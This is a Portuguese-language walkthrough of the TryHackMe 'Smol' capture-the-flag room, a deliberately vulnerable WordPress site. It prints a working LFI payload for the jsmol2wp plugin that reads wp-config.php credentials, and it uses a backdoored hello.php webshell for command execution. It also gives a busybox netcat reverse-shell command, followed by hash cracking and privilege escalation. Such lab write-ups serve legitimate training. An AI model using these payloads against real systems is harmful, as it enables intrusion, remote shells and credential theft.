# Room - SMOL - TryHackMe 
Autor: carlossb1\
Nível: Médio\
Tópico: Web / Linux


## Introdução

Informações do autor da máquina:

At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.

Quick Tips: Do you know that on computers without GPU like the AttackBox, John The Ripper is faster than Hashcat?

Informações chave:
- O alvo é um site wordpress;
- Existem plugins vulneráveis, inclusive um com um backdoor já instalado;
- Pela dica do john vs hashcat, já sabemos que a máquina vai envolver quebrar hashes.

## Enumeração

Vamos rodar o nmap nessa fera :\

`nmap -sC -sV <ip> -o scan`

![250603_11h43m43s_screenshot](https://github.com/user-attachments/assets/abedcead-ae60-45e0-a3d8-6e50f6ed5f13)

Podemos ver que a requisição http foi redirecionada para o endereço http://www.smol.thm, então vamos adicionar esse endereço na nossa lista de hosts
(o ip da máquina foi alterado algumas vezes durante as screenshots pois eu precisei resolver ela aos poucos, tendo que respawnar entre as tentativas)

`sudo vi /etc/hosts`

![250603_11h48m31s_screenshot](https://github.com/user-attachments/assets/7eadad59-d0c8-418a-9c3c-8506801c6998)

Após essa etapa, não devemos mais ter problemas com a resolução do dns, e conseguiremos acessar a página web.


![250603_11h57m43s_screenshot](https://github.com/user-attachments/assets/1ffa3acc-b914-4a96-9a10-865e7d8377e2)

A página no primeiro momento não apresenta nada de anormal ou que possamos interagir diretamente.

### WPSCAN

O wpscan é uma ferramenta muito útil para enumeração de sites feitos com base em wordpress.

Não é necessário se cadastrar para utilizar a ferramenta, mas quando você realiza o cadastro, recebe uma chave para utilização da API deles, que te permite utiliza algumas funcionalidades extras. Entre essas, a identificação de vulnerabilidades e o código dos CVEs:

`wpscan --api-token <TOKEN> -url http://www.smol.thm` 

![250603_12h07m23s_screenshot](https://github.com/user-attachments/assets/48f29a3d-fd10-4826-851d-d56180ce0aef)

Identificamos 2 CVEs: 2018-20463 e 2018-20462
## Exploração

### CVE 2018-20462

Pesquisando pelo CVE, encontramos essa prova de conceito:

https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt

Podemos abusar dessa falha para ler arquivos do sistema com o seguinte payload:

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`

Tendo acesso à configuração inicial do banco de dados do wordpress, conseguimos pegar as credenciais de um usuário

![250603_12h28m34s_screenshot](https://github.com/user-attachments/assets/6064b06e-f5d7-4dae-b127-396aab672b01)

Vamos tentar utilizá-la para logar.

![250603_12h29m12s_screenshot](https://github.com/user-attachments/assets/cb540757-2a27-44bb-ab55-403ae509c381)

Temos acesso ao dashboard de administração da página.

![250603_12h29m54s_screenshot](https://github.com/user-attachments/assets/07749b0f-b9a3-4445-8807-1de5907d3172)

Depois de rodar um pouco pelo dashboard, não encontrei muita coisa que pudesse ser feita além de uma parte que permitia realizar upload de imagens. Tentei bypassar o filtro por um tempo pra ver se conseguia fazer o upload de uma shell em php, mas depois de algumas tentativas decidi ver o que mais havia pelo site.

Em uma das páginas, havia um link de tarefas a fazer, em que era mencionado a revisão de um plugin para inspeção de backdoor.

Esse é o segundo plugin mencionado pelo autor do desafio.

![250603_12h39m20s_screenshot](https://github.com/user-attachments/assets/d4984b80-ac1e-4f78-ae0d-55c7151dca9a)

### Hello Dolly

Agora precisamos dar um jeito der ler o código do plugin.

Lembrando que temos LFI graças ao CVE 2018-20462, testei o payload para ler o código fonte do plugin jsmol:

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/jsmol2wp/php/jsmol.php`

![250603_12h45m42s_screenshot](https://github.com/user-attachments/assets/21df055d-2dee-4170-b985-1e759f2396c0)


Tentando ler o o código do hello-dolly:

Seguindo a recomendação do próprio WordPress quanto à organização dos plugins:

![250603_13h08m36s_screenshot](https://github.com/user-attachments/assets/4f5342c2-22ea-4e54-915b-6b45cc92fbc9)


E o código do plugin no github:

![250603_13h22m07s_screenshot](https://github.com/user-attachments/assets/4c41aece-6437-4e2a-8340-cdcc73799697)

Tentei utilizar o seguinte payload para ler o código do plugin no server:

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello-dolly/hello.php`

Depois de entrar num loophole enorme, encontrei essa thread de discussão dos desenvolvedores, que fala justamente sobre essa característica do plugin:

https://core.trac.wordpress.org/ticket/53323

![250603_13h30m22s_screenshot](https://github.com/user-attachments/assets/aff31b1b-511a-4a3e-b50b-99ecbe3fe8e4)

Resumindo a thread, nas versões antigas, o plugin não ficava dentro de uma pasta própria, indo contra as boas práticas indicadas pelos desenvolvedores. Foi feito um esforço para alterar essa condição nas versões mais novas, mas parece que no nosso alvo a versão ainda não está atualizada.

Então editamos nosso payload para acessar o código do plugin:

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php`

![250603_13h34m03s_screenshot](https://github.com/user-attachments/assets/f4670307-9c72-486b-8d59-cafbef9c019a)

Achamos o backdoor dentro do código, um webshell codificado em base64:

![250603_13h35m18s_screenshot](https://github.com/user-attachments/assets/56f9ffc1-0748-4185-9d5e-ecce46e8d9f8)

Depois de decodificar o b64, os caracteres que recebem o comando ainda continuam obfuscados. 

Convertendo os dois caracteres hexadecimais para ascii, obtemos: [ ][x6d][x64] - > [ ][m][d]
Por aqui já dava pra chutar que o parâmetro seria "cmd". O 143 não é conversível de decimal para ASCII, depois de procurar um pouco, vi que convertendo de octal para ASCII, conseguimos identificar o último caractere, que de fato é o "c".

Vamos testar a execução de código:

`http://www.smol.thm/wp-admin.php/about.php?cmd=ls`

![250603_14h09m44s_screenshot](https://github.com/user-attachments/assets/b72ea9a0-1684-4367-8508-57084dedc416)

Conseguimos utilizar o backdoor com sucesso para execução de código remoto.

## Exfiltrando credenciais do banco de dados

Agora que temos RCE, vamos pegar uma shell na máquina:
(Eu tenho usado bastante o busybox para invocar o netcat, nessas rooms ele geralmente está presente e dá certo com frequência)

no site: `http://www.smol.thm/wp-admin.php/about.php?cmd=busybox nc <ip> <porta> -e sh` 

na máquina: `nc -lvnp <porta>`

![250603_14h15m31s_screenshot](https://github.com/user-attachments/assets/d09a8e46-e28f-4070-bb29-c853e76ea494)

Agora que temos a shell na máquina, vamos tentar nos conectar ao MySQL usando as credenciais que pegamos na configuração do wp-config.php

![250603_14h17m55s_screenshot](https://github.com/user-attachments/assets/4507e13f-f691-41b8-a7ac-26699e28cd0e)

Conseguimos acesso aos nomes dos usuários e às hashes das senhas.

![250603_14h17m41s_screenshot](https://github.com/user-attachments/assets/96e3b0e1-4b20-44af-af05-30b9d98190d6)


Vamos copiar essas informações para nossa máquina e tentar quebrar as hashes utilizando o John the Ripper.

Após preparar as hashes para quebra, as deixando no formato nome do usuário:hash.

![250603_14h20m04s_screenshot](https://github.com/user-attachments/assets/153af751-02bd-4230-8663-bd42a0c6180a)

## Flag do user

Conseguimos quebrar a hash do usuário diego

![250603_11h26m12s_screenshot](https://github.com/user-attachments/assets/7f42eef5-e1e1-425c-ae2c-b06c4214cd59)

Trocando de usuário na nossa shell reversa

![250603_14h52m37s_screenshot](https://github.com/user-attachments/assets/bd274264-9608-438a-a31c-bdc7fca94107)

Flag de user encontrada. 

## PrivEsc

O gurpo do usuário diego tem privilégios para acesso às pastas dos outros usuários, então vamos ver o que encontramos:

![250603_14h53m19s_screenshot](https://github.com/user-attachments/assets/7505dc3e-2569-4ff2-81d5-d6bd49690e80)

Conseguimos copiar a chave ssh do usuário think.

### Think

O Think também faz parte do grupo, e depois de enumerar o básico, fiquei perdido sem saber o que fazer. Precisei de uma dica e me perguntaram se eu havia tentado trocar de usuário sem utilizar a senha. 
Não tinha pensado nisso, por mais básico que seja. O usuário think consegue mudar de conta para gege sem utilizar senha.

![250603_15h00m23s_screenshot](https://github.com/user-attachments/assets/482e271a-e0eb-40e9-963c-80c2dd4800e0)


Agora podemos transferir o arquivo para nossa máquina e realizar a análise

O arquivo precisa de senha para ser extraído, tentei utilizar a senha do wpuser e não funcionou, então vamos usar um utilitário do John para ver se conseguimos quebrar essa senha:

![250603_15h07m00s_screenshot](https://github.com/user-attachments/assets/4574b28c-3c16-4794-bafd-14792c3381a7)


Conseguimos a senha do arquivo: hero_gege@hotmail.com - agora podemos extrair ele.

![250603_15h07m41s_screenshot](https://github.com/user-attachments/assets/220dbb0d-9400-4fe1-8e05-e6bff2405fa6)

A pasta contém um arquivo wp-config que contém a senha do usuário xavi.

Trocamos para esse usuário e vemos que ele tem permissões de sudo, então bastou usar o sudo su e rootamos a máquina.


![250603_15h17m05s_screenshot](https://github.com/user-attachments/assets/78aa930c-f669-4e4e-bb51-a9731a3fc376)

### Conclusão

Gostei muito dessa máquina, apesar de não ser muito fã das que envolvem processos de quebra de hash ou brute force, essa foi bem legal.
Em alguns momentos eu caí numas tocas de coelho bem feias - principalmente na hora de encontrar o arquivo hello.php e na escalação de privilégios.
Particularmente na PrivEsc, eu acho que essa seção ficou um pouco corrida, mas eu fiquei tanto tempo dando murro em ponta de faca que acabei pulando pra só incluir as soluções aqui mesmo. Talvez depois eu revise pra adicionar algumas das outras coisas que eu tentei sem sucesso.

